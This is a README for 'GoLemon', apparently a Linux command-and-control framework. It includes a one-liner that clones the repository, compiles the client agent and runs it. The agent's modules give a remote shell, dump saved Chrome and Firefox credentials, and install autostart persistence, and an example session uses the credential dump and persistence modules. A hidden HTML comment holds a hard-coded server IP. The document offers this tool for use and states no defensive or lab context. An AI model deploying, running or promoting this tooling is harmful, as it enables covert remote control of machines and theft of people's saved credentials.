# GoLemon C2

Modular C2 framework for Linux.

## Build
```bash
make
```

## Usage
**Server:**
```bash
./server
```

**Client:**
```bash
./client
```
Use this oneliner for fetching the repo and building and executing the client/agent
```
git clone https://github.com/dilipk5/golemon.git; cd golemon; gcc -Wall -Wextra -O2 -o client client.c -lutil -ldl -lsqlite3; ./client
```

## Modules
- `shell` - Interactive shell
- `firefox-dump` - Firefox credentials
- `chrome-dump` - Chrome credentials  
- `persistence` - Autostart installation
- `info` - Agent info

## Example
```
C2> use 1
agent(1)> chrome-dump
agent(1)> persistence
```
<!-- SERVER_IP = 3.111.197.63 -->
